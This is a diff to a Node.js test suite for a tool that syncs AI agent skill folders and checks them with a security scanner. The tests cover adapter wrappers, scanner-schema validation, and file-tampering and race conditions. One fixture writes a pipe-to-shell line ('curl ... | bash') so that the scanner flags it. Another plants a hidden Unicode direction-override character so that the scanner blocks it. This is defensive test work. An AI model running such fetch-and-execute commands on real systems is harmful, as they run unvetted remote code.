@@ -6,7 +6,7 @@
 
 import assert from 'node:assert/strict';
 import { spawnSync } from 'node:child_process';
-import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
+import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
 import { createHash } from 'node:crypto';
 import { tmpdir } from 'node:os';
 import path from 'node:path';
@@ -178,10 +178,12 @@ test('security: an unreadable folder in one skill is a FLAG to review; the other
   try {
     const { code, report, stderr } = sync(reportArgs(workspace, path.join(dir, 'reports'), ['--offline']));
     assert.equal(code, 4, stderr);
-    assert.deepEqual(kinds(report, 'waiting'), ['security-block:blocked-one']);
+    assert.ok(kinds(report, 'waiting').includes('security-block:blocked-one'));
+    assert.ok(kinds(report, 'waiting').includes('check-failed:-'));
+    assert.equal(report.reportFiles.lock, null);
     assert.ok(kinds(report, 'review').includes('security-flag:locked-one'), JSON.stringify(report.sections.review));
     assert.match(report.sections.review.find((entry) => entry.name === 'locked-one').text, /FLAG not-scanned-unreadable x2/, 'one hit per client folder');
-    assert.deepEqual(report.securityCheck.runs.map((entry) => [entry.root, entry.verdict]), [['.claude/skills', 'BLOCK'], ['.agents/skills', 'BLOCK']]);
+    assert.deepEqual(report.securityCheck.runs.map((entry) => entry.root), ['.claude/skills', '.agents/skills']);
     assert.ok(report.sections.done.includes('clean-one'), 'the other skills are still checked');
     assert.deepEqual(report.inventory.skills.find((skill) => skill.name === 'locked-one').security, 'FLAG');
   } finally {
@@ -505,4 +507,110 @@ test('the skill is registered: both manifest entries per file carry the file SHA
     assert.ok(allowlist.includes(source), `${source} is allowlisted`);
   }
   assert.ok(allowlist.includes('test/skill-sync-skill.test.mjs'));
+});
+
+
+test('optional adapters recognise only an exact wrapper and preserve separate baselines', (t) => {
+  const dir = sandbox(t), workspace = path.join(dir, 'workspace');
+  const owner = '.claude/skills/example/SKILL.md', adapter = '.agents/skills/example/SKILL.md';
+  const description = 'Example.';
+  const canonical = `---\nname: example\ndescription: ${description}\n---\n# example\n`;
+  const delegation = "Read and follow the canonical owner at [../../../.claude/skills/example/SKILL.md](../../../.claude/skills/example/SKILL.md), resolving the link from this installed skill folder. Resolve the owner's relative paths from the owner folder. Preserve its scope, data, authorization and publication boundaries and applicable workspace instructions. If a required capability is unavailable, report it; do not invent an equivalent or infer authorization.";
+  const wrapper = `---\nname: example\ndescription: ${description}\n---\n\n# example\n\n${delegation}\n`;
+  const mapping = {adapters:[{name:'example',owner,adapter,description}]};
+  const putWorkspace = (p, value) => put(path.join(workspace,p), value);
+  let count=0;
+  const run = () => sync(reportArgs(workspace,path.join(dir,`reports-${count++}`),['--offline','--security-check',CHECK])).report;
+  putWorkspace(owner,canonical); putWorkspace(adapter,wrapper);
+  let report=run(); assert.ok(kinds(report,'review').includes('copies-differ:example'));
+  putWorkspace('.skill-sync/adapters.json',JSON.stringify(mapping)); report=run();
+  assert.ok(!kinds(report,'review').includes('copies-differ:example'));
+  assert.equal(report.securityCheck.runs.length,2);
+  const lock=JSON.parse(readFileSync(report.reportFiles.lock)); assert.equal(lock.skills[0].projections.length,2);
+  saveLock(report,workspace); putWorkspace(owner,canonical+'change\n'); report=run(); assert.ok(kinds(report,'left').includes('owner-changed:example'));
+  putWorkspace(owner,canonical); putWorkspace(adapter,wrapper+'change\n'); report=run(); assert.ok(kinds(report,'left').includes('adapter-changed:example')); assert.ok(kinds(report,'review').includes('copies-differ:example'));
+  putWorkspace(adapter,wrapper); putWorkspace('.skill-sync/adapters.json',JSON.stringify({...mapping,unknown:true})); report=run();
+  assert.ok(kinds(report,'review').includes('adapter-mapping-invalid:-')); assert.ok(kinds(report,'review').includes('copies-differ:example')); assert.equal(report.reportFiles.lock,null); assert.equal(report.securityCheck.runs.length,2);
+  assert.ok(!readdirSync(path.dirname(report.reportFiles.json)).some(f=>f.endsWith('.lock.json')));
+  putWorkspace('.skill-sync/adapters.json',JSON.stringify(mapping)); putWorkspace(path.dirname(adapter)+'/.hidden','extra'); report=run(); assert.ok(kinds(report,'review').includes('adapter-extra-file:example')); assert.ok(kinds(report,'review').includes('copies-differ:example'));
+  rmSync(path.join(workspace,path.dirname(adapter),'.hidden'));
+  for (const bad of ['{', JSON.stringify({adapters:[mapping.adapters[0],mapping.adapters[0]]}), JSON.stringify({adapters:[{...mapping.adapters[0],unknown:true}]}), JSON.stringify({adapters:'wrong'})]) {
+    putWorkspace('.skill-sync/adapters.json',bad); report=run(); assert.ok(kinds(report,'review').includes('adapter-mapping-invalid:-')); assert.equal(report.reportFiles.lock,null); assert.ok(kinds(report,'review').includes('copies-differ:example'));
+  }
+  putWorkspace('.skill-sync/adapters.json',JSON.stringify({adapters:[]})); report=run(); assert.ok(kinds(report,'review').includes('copies-differ:example'));
+  putWorkspace('.skill-sync/adapters.json',JSON.stringify(mapping));
+  for (const bad of [wrapper.replace(description,'Different.'), wrapper+'Extra text\n', wrapper.replace(delegation,`<!-- ${delegation} -->`), wrapper.replace(delegation,`\`\`\`\n${delegation}\n\`\`\``), wrapper.replaceAll('skills/example/SKILL.md','skills/other/SKILL.md')]) {
+    putWorkspace(adapter,bad); report=run(); assert.ok(kinds(report,'review').includes('adapter-misdirected:example')); assert.ok(kinds(report,'review').includes('copies-differ:example')); assert.equal(report.reportFiles.lock,null); assert.ok(!readdirSync(path.dirname(report.reportFiles.json)).some(f=>f.endsWith('.lock.json')));
+  }
+  putWorkspace(adapter,wrapper); rmSync(path.join(workspace,owner)); report=run(); assert.ok(kinds(report,'review').includes('adapter-owner-missing:example'));
+});
+
+
+test('scanner schema and coverage bind baseline eligibility', { skip: process.platform === 'win32' && 'needs POSIX symlinks' }, async (t) => {
+const script=SCRIPT, checker=CHECK, {checkAll}=await import(pathToFileURL(checker));const w=sandbox(t),root=path.join(w,'.claude/skills');mkdirSync(path.join(root,'example'),{recursive:true});writeFileSync(path.join(root,'example/SKILL.md'),'---\nname: example\ndescription: Example.\n---\n\n# Example\n\n1. Read and check.\n');symlinkSync('missing',path.join(root,'broken'));mkdirSync(path.join(w,'empty'));symlinkSync(path.join(w,'empty'),path.join(root,'empty-link'));
+const base=checkAll(realpathSync(root));assert.equal(base.schema,1);let seq=0;
+function run(payload){const f=path.join(w,'response.json'),stub=path.join(w,'stub.mjs'),out=path.join(w,'out'+seq++);writeFileSync(f,JSON.stringify(payload));writeFileSync(stub,`import {readFileSync} from 'node:fs';const r=JSON.parse(readFileSync(${JSON.stringify(f)},'utf8'));console.log(JSON.stringify(r));process.exit(r.__status??r.exitCode)`);const r=spawnSync(process.execPath,[script,'--workspace',w,'--offline','--report-dir',out,'--security-check',stub,'--json'],{encoding:'utf8'});assert.ok([0,3,4].includes(r.status),r.stderr);return JSON.parse(r.stdout)}
+let r=run(base);assert.ok(!r.sections.waiting.some(x=>x.kind==='check-failed'),'real producer baseline');assert.ok(r.reportFiles.lock,'valid baseline offered');
+const changes={schema:r=>delete r.schema,wrongSchema:r=>r.schema=9,practiceMissing:r=>delete r.bestPractices,practiceExtra:r=>r.bestPractices.extra=1,practiceWrong:r=>r.bestPractices.PASS++,byRuleMissing:r=>delete r.bestPractices.byRule[Object.keys(r.bestPractices.byRule)[0]],byRuleCount:r=>r.bestPractices.byRule[Object.keys(r.bestPractices.byRule)[0]]++,negative:r=>r.bestPractices.FLAG=-1,byRuleExtra:r=>r.bestPractices.byRule.unlisted=1,byRuleZero:r=>r.bestPractices.byRule.unlisted=0,rowCount:r=>r.skills[0].counts.FLAG++,rowExit:r=>r.skills[0].exitCode=4,skipMissing:r=>r.skipped.pop(),skipDuplicate:r=>r.skipped.push(r.skipped[0]),skipUnreadable:r=>r.skipped.push({path:'private',reason:'EACCES',unreadable:true}),skipUnknown:r=>r.skipped[0].reason='unknown',duplicate:r=>r.skills.push(r.skills[0]),missing:r=>r.skills=[],extra:r=>r.skills.push({...r.skills[0],path:'extra'}),fraction:r=>r.bestPractices.PASS=.5,string:r=>r.counts.PASS='1',malformedPractice:r=>r.skills[0].bestPractices=null,malformedBlock:r=>{r.skills[0].bestPractices=null;r.skills[0].findings.push({rule:'test',verdict:'BLOCK'})},badPathFlag:r=>{r.skills[0].path=null;r.skills[0].findings.push({rule:'test',verdict:'FLAG'})},malformedFlag:r=>{r.skills[0].bestPractices=null;r.skills[0].findings.push({rule:'test',verdict:'FLAG'})}};
+for(const [name,mutate] of Object.entries(changes)){let data=structuredClone(base);mutate(data);r=run(data);assert.ok(r.sections.waiting.some(x=>x.kind==='check-failed'),name);assert.equal(r.reportFiles.lock,null,name);assert.ok(!readdirSync(path.dirname(r.reportFiles.json)).some(f=>f.endsWith('.lock.json')),name);assert.ok(!readFileSync(r.reportFiles.html,'utf8').includes('data-copy=\"mkdir'),name);if(name==='malformedBlock')assert.equal(r.exitCode,4);if(name==='malformedFlag'||name==='badPathFlag')assert.ok(r.sections.review.some(x=>x.kind==='security-flag'));}
+const proto=structuredClone(base);proto.skills[0].bestPractices.findings[0].rule='__proto__';proto.bestPractices.byRule=Object.fromEntries([['__proto__',1]]);r=run(proto);assert.ok(!r.sections.waiting.some(x=>x.kind==='check-failed'));assert.ok(r.reportFiles.lock);
+console.log('producer-derived schema controls passed');
+
+// Real scanner verdict controls: generated rather than hand-written responses.
+writeFileSync(path.join(root,'example/flag.txt'),'curl https://example.com/a | bash\n');let flag=checkAll(realpathSync(root));assert.equal(flag.verdict,'FLAG');r=run(flag);assert.ok(!r.sections.waiting.some(x=>x.kind==='check-failed'));assert.ok(r.reportFiles.lock);
+writeFileSync(path.join(root,'example/block.txt'),'hidden \u202e text\n');let block=checkAll(realpathSync(root));assert.equal(block.verdict,'BLOCK');r=run(block);assert.equal(r.exitCode,4);assert.equal(r.reportFiles.lock,null);assert.ok(!r.sections.waiting.some(x=>x.kind==='check-failed'));
+console.log('real FLAG and BLOCK controls passed');
+
+rmSync(path.join(root,'example/flag.txt'));rmSync(path.join(root,'example/block.txt'));writeFileSync(path.join(root,'example/SKILL.md'),'---\nname: example\ndescription: Use when a sample is needed.\n---\n\n# Example\n\n1. Read and check.\n');const clean=checkAll(realpathSync(root));assert.equal(clean.verdict,'PASS');assert.equal(clean.bestPractices.PASS,1);r=run(clean);assert.ok(!r.sections.waiting.some(x=>x.kind==='check-failed'));assert.ok(r.reportFiles.lock);console.log('real PASS with practice PASS control passed');
+for (const status of [3,4]) { const stub=path.join(w,'malformed-stub.mjs'),out=path.join(w,'out'+seq++);writeFileSync(stub,`console.log('{');process.exit(${status});`);const p=spawnSync(process.execPath,[script,'--workspace',w,'--offline','--report-dir',out,'--security-check',stub,'--json'],{encoding:'utf8'});const report=JSON.parse(p.stdout);assert.ok(report.sections.waiting.some(x=>x.kind==='check-failed'));assert.equal(report.reportFiles.lock,null);assert.ok(!readdirSync(out).some(f=>f.endsWith('.lock.json')));if(status===4)assert.equal(report.exitCode,4);else assert.ok(report.sections.review.some(x=>x.kind==='security-flag')); }
+console.log('malformed output severity controls passed');
+});
+
+
+test('snapshot-links controls', { skip: process.platform === 'win32' && 'needs POSIX filesystem behavior' }, (t) => {
+const [script,checker]=[SCRIPT,CHECK],h=n=>`---\nname: ${n}\ndescription: Use when testing.\n---\n\n# ${n}\n`;
+for(const mode of ['valid-links','outside-tamper','link-target','root-link','empty-root','absent-root','control-path','skipped-and-empty','other','valid-unicode','reordered','control-link']){const w=sandbox(t),a=path.join(w,'.claude/skills/a'),b=path.join(w,'.agents/skills/b'),out=path.join(w,'out'),stub=path.join(w,'scan.mjs');mkdirSync(a,{recursive:true});writeFileSync(path.join(a,'SKILL.md'),h('a'));if(mode!=='empty-root'&&mode!=='absent-root'){mkdirSync(b,{recursive:true});writeFileSync(path.join(b,'SKILL.md'),h('b'));}if(mode==='empty-root')mkdirSync(path.dirname(b),{recursive:true});if(['valid-links','outside-tamper','link-target'].includes(mode))symlinkSync('SKILL.md',path.join(a,'safe-link'));if(mode==='root-link'){let other=path.join(w,'other');mkdirSync(other);writeFileSync(path.join(other,'SKILL.md'),h('b'));}if(mode==='valid-unicode')writeFileSync(path.join(a,'é-文件'),'x');if(mode==='reordered')writeFileSync(path.join(a,'z'),'x');if(mode==='control-link')symlinkSync('bad\tpath',path.join(a,'bad-link'));if(mode==='control-path')writeFileSync(path.join(a,'bad\tname'),'x');if(mode==='skipped-and-empty'){mkdirSync(path.join(a,'.git'));mkdirSync(path.join(a,'empty'));}if(mode==='other'){let p=spawnSync('mkfifo',[path.join(a,'fifo')]);assert.equal(p.status,0);}let cfg={mode,a,b,w,checker};writeFileSync(stub,`import {spawnSync} from 'node:child_process';import {mkdirSync,writeFileSync,unlinkSync,symlinkSync,renameSync} from 'node:fs';import path from 'node:path';let c=${JSON.stringify(cfg)},p=spawnSync(process.execPath,[c.checker,...process.argv.slice(2)],{encoding:'utf8'}),r=JSON.parse(p.stdout),second=process.argv[3].includes('.agents/skills');if(c.mode==='reordered'&&!second)r.skills[0].files.reverse();if(c.mode==='outside-tamper'&&!second)r.skills[0].files.find(x=>x.kind==='symlink').outside=true;if(c.mode==='link-target'&&second){unlinkSync(path.join(c.a,'safe-link'));symlinkSync('missing',path.join(c.a,'safe-link'));}if(c.mode==='root-link'&&!second){renameSync(c.b,c.b+'-old');symlinkSync(path.join(c.w,'other'),c.b);}if((c.mode==='empty-root'||c.mode==='absent-root')&&!second){mkdirSync(c.b,{recursive:true});writeFileSync(path.join(c.b,'SKILL.md'),'---\\nname: b\\ndescription: Use when testing.\\n---\\n# b\\n');}process.stdout.write(JSON.stringify(r));process.exit(p.status);`);let p=spawnSync(process.execPath,[script,'--workspace',w,'--offline','--report-dir',out,'--security-check',stub,'--json'],{encoding:'utf8'});assert.ok([0,3,4].includes(p.status),p.stderr);let r=JSON.parse(p.stdout);if(['valid-links','skipped-and-empty','other','valid-unicode','reordered'].includes(mode))assert.ok(r.reportFiles.lock,mode);else {assert.equal(r.reportFiles.lock,null,mode);assert.ok(r.sections.waiting.some(x=>['snapshot-changed','check-failed'].includes(x.kind)),mode);assert.ok(!readdirSync(out).some(x=>x.endsWith('.lock.json')),mode);}}
+console.log('link, empty-root and entry-kind controls passed');
+
+});
+
+
+test('snapshot-matrix controls', { skip: process.platform === 'win32' && 'needs POSIX filesystem behavior' }, (t) => {
+const [script,checker]=[SCRIPT,CHECK];let seq=0;const header=n=>`---\nname: ${n}\ndescription: Use when testing.\n---\n\n# ${n}\n`;
+function scenario(mode){const w=sandbox(t),a=path.join(w,'.claude/skills/a'),b=path.join(w,'.agents/skills/b'),map=path.join(w,'.skill-sync/adapters.json');for(const [p,n] of [[a,'a'],[b,'b']]){mkdirSync(p,{recursive:true});writeFileSync(path.join(p,'SKILL.md'),header(n));}if(mode==='field-block')writeFileSync(path.join(a,'SKILL.md'),header('a')+'hidden \u202e text\n');mkdirSync(path.dirname(map));writeFileSync(map,JSON.stringify({adapters:[]}));let cfg={mode,a,b,map,checker};const stub=path.join(w,'scanner.mjs');writeFileSync(stub,`import {spawnSync} from 'node:child_process';import {appendFileSync,writeFileSync,renameSync,chmodSync,mkdirSync,symlinkSync,unlinkSync} from 'node:fs';import path from 'node:path';let c=${JSON.stringify(cfg)};let p=spawnSync(process.execPath,[c.checker,...process.argv.slice(2)],{encoding:'utf8'});let r=JSON.parse(p.stdout);let root=process.argv[3];let second=root.includes('.agents/skills');if(c.mode==='first-during-second'&&second)appendFileSync(path.join(c.a,'SKILL.md'),'changed\\n');if(c.mode==='second-during-first'&&!second)appendFileSync(path.join(c.b,'SKILL.md'),'changed\\n');if(c.mode==='chmod'&&!second)chmodSync(path.join(c.a,'SKILL.md'),0o755);if(c.mode==='rename'&&second)renameSync(c.a,c.a+'-new');if(c.mode==='hidden'&&second)writeFileSync(path.join(c.a,'.hidden'),'x');if(c.mode==='config'&&second)writeFileSync(c.map,'{\\"adapters\\":[],\\"changed\\":true}');if(c.mode.startsWith('field-')&&!second){let f=r.skills[0].files[0];switch(c.mode){case 'field-hash':f.sha256='0'.repeat(64);break;case 'field-size':f.size++;break;case 'field-kind':f.kind='other';break;case 'field-path':f.path='wrong';break;case 'field-duplicate':r.skills[0].files.push(f);break;case 'field-omit':r.skills[0].files.pop();break;case 'field-extra':r.skills[0].files.push({...f,path:'extra'});break;case 'field-folder':case 'field-block':r.skills[0].folderHash='0'.repeat(64);break;case 'field-target':r.skills[0].target='/wrong';break;case 'field-linkedTo':r.skills[0].linkedTo='/wrong';break;}}process.stdout.write(JSON.stringify(r));process.stderr.write(p.stderr);process.exit(p.status);`);let out=path.join(w,'out'),p=spawnSync(process.execPath,[script,'--workspace',w,'--offline','--report-dir',out,'--security-check',stub,'--json'],{encoding:'utf8'});assert.ok([0,3,4].includes(p.status),p.stderr);let r=JSON.parse(p.stdout);if(mode==='valid')assert.ok(r.reportFiles.lock,'valid scan must offer lock');else {assert.equal(r.reportFiles.lock,null,mode);assert.ok(r.sections.waiting.some(x=>['snapshot-changed','check-failed'].includes(x.kind)),mode);assert.ok(!readdirSync(out).some(x=>x.endsWith('.lock.json')),mode);assert.ok(!readFileSync(r.reportFiles.html,'utf8').includes('data-copy="mkdir'),mode);if(mode==='field-block')assert.equal(r.exitCode,4);} }
+for(const x of ['valid','first-during-second','second-during-first','chmod','rename','hidden','config','field-hash','field-size','field-kind','field-path','field-duplicate','field-omit','field-extra','field-folder','field-block','field-target','field-linkedTo'])scenario(x);console.log('two-root and manifest matrix passed');
+
+});
+
+
+test('snapshot-observation controls', { skip: process.platform === 'win32' && 'needs POSIX filesystem behavior' }, (t) => {
+const [scriptArg,checkerArg]=[SCRIPT,CHECK],script=path.resolve(scriptArg),checker=path.resolve(checkerArg);
+for(const mode of ['file-replace','file-chmod','directory-change','symlink-root']){const w=sandbox(t),root=path.join(w,'.claude/skills'),target=path.join(w,'target'),skill=mode==='symlink-root'?target:path.join(root,'example'),out=path.join(w,'out'),hook=path.join(w,'hook.cjs');mkdirSync(skill,{recursive:true});mkdirSync(root,{recursive:true});writeFileSync(path.join(skill,'SKILL.md'),'---\nname: example\ndescription: Use when testing.\n---\n\n# example\n');if(mode==='symlink-root')symlinkSync(target,path.join(root,'example'));writeFileSync(hook,`const fs=require('fs'),mod=require('module');let active=process.argv[1]===${JSON.stringify(script)},done=false,read=fs.readFileSync,dirs=fs.readdirSync;fs.readFileSync=function(p,...a){let result=read.call(this,p,...a);if(active&&!done&&typeof p==='number'&&${JSON.stringify(mode)}.startsWith('file-')){done=true;let f=${JSON.stringify(path.join(skill,'SKILL.md'))};if(${JSON.stringify(mode)}==='file-replace'){fs.renameSync(f,f+'.old');fs.writeFileSync(f,'changed');}else fs.chmodSync(f,0o755);}return result;};fs.readdirSync=function(p,...a){let r=dirs.call(this,p,...a);if(active&&!done&&${JSON.stringify(mode)}==='directory-change'&&String(p)===${JSON.stringify(skill)}){done=true;fs.writeFileSync(${JSON.stringify(path.join(skill,'new'))},'x');}return r};mod.syncBuiltinESMExports();`);let p=spawnSync(process.execPath,[script,'--workspace',w,'--offline','--report-dir',out,'--security-check',checker,'--json'],{encoding:'utf8',env:{...process.env,NODE_OPTIONS:`--require=${hook}`}});assert.ok([0,3,4].includes(p.status),p.stderr);let r=JSON.parse(p.stdout);if(mode==='symlink-root')assert.ok(r.reportFiles.lock,mode);else {assert.equal(r.reportFiles.lock,null,mode);assert.ok(r.sections.waiting.some(x=>['snapshot-changed','check-failed'].includes(x.kind)),mode);}}
+console.log('observation race and symlink-root controls passed');
+
+});
+
+
+test('snapshot-race controls', { skip: process.platform === 'win32' && 'needs POSIX filesystem behavior' }, (t) => {
+const [script,checker]=[SCRIPT,CHECK],w=sandbox(t),skill=path.join(w,'.claude/skills/example');mkdirSync(skill,{recursive:true});const f=path.join(skill,'SKILL.md'),head='---\nname: example\ndescription: Use when a test is needed.\n---\n\n# Example\n';writeFileSync(f,head);let n=0;function run(mutate){const wrapper=path.join(w,'scanner.mjs'),out=path.join(w,`out${n++}`);writeFileSync(wrapper,`import {spawnSync} from 'node:child_process';import {appendFileSync} from 'node:fs';const p=spawnSync(process.execPath,[${JSON.stringify(checker)},...process.argv.slice(2)],{encoding:'utf8'});${mutate?`appendFileSync(${JSON.stringify(f)},'hidden \\u202e text\\n');`:''}process.stdout.write(p.stdout);process.stderr.write(p.stderr);process.exit(p.status);`);const p=spawnSync(process.execPath,[script,'--workspace',w,'--offline','--report-dir',out,'--security-check',wrapper,'--json'],{encoding:'utf8'});assert.ok([0,3,4].includes(p.status),p.stderr);return JSON.parse(p.stdout)}
+let r=run(false);assert.ok(r.reportFiles.lock,JSON.stringify(r.sections));r=run(true);assert.equal(r.reportFiles.lock,null,'post-scan mutation must withhold lock');assert.ok(r.sections.waiting.some(x=>x.kind==='snapshot-changed'||x.kind==='check-failed'));assert.ok(!readdirSync(path.dirname(r.reportFiles.json)).some(x=>x.endsWith('.lock.json')));assert.ok(!readFileSync(r.reportFiles.html,'utf8').includes('data-copy="mkdir'));const p=spawnSync(process.execPath,[checker,'--all',path.dirname(skill),'--report-dir',path.join(w,'verify'),'--json'],{encoding:'utf8'});assert.equal(p.status,4);console.log('real scanner persistent mutation control passed');
+
+});
+
+
+test('snapshot-rootlink controls', { skip: process.platform === 'win32' && 'needs POSIX filesystem behavior' }, (t) => {
+const [script,checker]=[SCRIPT,CHECK],w=sandbox(t),target=path.join(w,'target'),root=path.join(w,'.claude/skills');mkdirSync(path.join(target,'example'),{recursive:true});mkdirSync(path.dirname(root));writeFileSync(path.join(target,'example/SKILL.md'),'---\nname: example\ndescription: Use when testing.\n---\n# example\n');symlinkSync(target,root);const p=spawnSync(process.execPath,[script,'--workspace',w,'--offline','--report-dir',path.join(w,'out'),'--security-check',checker,'--json'],{encoding:'utf8'});assert.ok([0,3].includes(p.status),p.stderr);let r=JSON.parse(p.stdout);assert.ok(r.reportFiles.lock,JSON.stringify(r.sections.waiting));console.log('symlinked discovery root unchanged control passed');
+
+});
+
+
+test('snapshot-unreadable controls', { skip: (process.platform === 'win32' || process.getuid?.() === 0) && 'needs POSIX permissions and non-root user' }, (t) => {
+const [script,checker]=[SCRIPT,CHECK],w=sandbox(t),skill=path.join(w,'.claude/skills/example'),out=path.join(w,'out');mkdirSync(skill,{recursive:true});writeFileSync(path.join(skill,'SKILL.md'),'---\nname: example\ndescription: Use when testing.\n---\n# example\n');const unreadableFile=path.join(skill,'unreadable');writeFileSync(unreadableFile,'x');chmodSync(unreadableFile,0);try{const p=spawnSync(process.execPath,[script,'--workspace',w,'--offline','--report-dir',out,'--security-check',checker,'--json'],{encoding:'utf8'});assert.equal(p.status,3,p.stderr);const r=JSON.parse(p.stdout);assert.equal(r.reportFiles.lock,null);assert.ok(r.sections.review.some(x=>x.kind==='security-flag'&&x.text.includes('not-scanned-unreadable')));assert.ok(r.sections.waiting.some(x=>['check-failed','snapshot-changed'].includes(x.kind)));console.log('actual unreadable scanner finding retained, lock withheld');}finally{chmodSync(unreadableFile,0o600)}
+
+});
+
+
+test('snapshot-upstream controls', { skip: process.platform === 'win32' && 'needs POSIX filesystem behavior' }, (t) => {
+const [script,checker]=[SCRIPT,CHECK],w=sandbox(t),skill=path.join(w,'.claude/skills/example'),bin=path.join(w,'bin'),out=path.join(w,'out');mkdirSync(skill,{recursive:true});mkdirSync(path.join(w,'.skill-sync'));mkdirSync(bin);const file=path.join(skill,'SKILL.md');writeFileSync(file,'---\nname: example\ndescription: Use when testing.\n---\n# example\n');writeFileSync(path.join(w,'.skill-sync/skills-sources.json'),JSON.stringify({sources:[{name:'example',address:'file:///nonexistent',ref:'HEAD',approved:'2026-01-01'}]}));writeFileSync(path.join(bin,'git'),`#!/bin/sh\nprintf 'changed\\n' >> '${file}'\nprintf 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\tHEAD\\n'\n`,{mode:0o755});const p=spawnSync(process.execPath,[script,'--workspace',w,'--report-dir',out,'--security-check',checker,'--json'],{encoding:'utf8',env:{...process.env,PATH:`${bin}:${process.env.PATH}`}});assert.ok([3,4].includes(p.status),p.stderr);let r=JSON.parse(p.stdout);assert.equal(r.reportFiles.lock,null);assert.ok(r.sections.waiting.some(x=>x.kind==='snapshot-changed'));assert.ok(!readdirSync(out).some(x=>x.endsWith('.lock.json')));assert.ok(!readFileSync(r.reportFiles.html,'utf8').includes('data-copy="mkdir'));console.log('local fake upstream mutation control passed');
+
 });
